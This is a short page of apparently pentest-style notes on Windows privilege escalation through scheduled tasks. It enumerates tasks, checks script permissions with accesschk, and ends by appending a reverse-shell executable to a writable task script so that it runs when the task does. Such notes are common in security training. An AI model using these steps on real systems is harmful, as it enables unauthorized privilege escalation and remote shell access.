---
title: Scheduled Tasks
parent: Method (Windows)
layout: default
nav_order: 4
---

1. Check all scheduled tasks: `schtasks /query /fo LIST /v` or Powershell:\
   `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State `
2. Use accesschk to check on any suspicious script: `accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
3. Backup the script: `copy C:\DevTools\CleanUp.ps1 C:\Temp\`
4. Start listener and append shell to script: `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`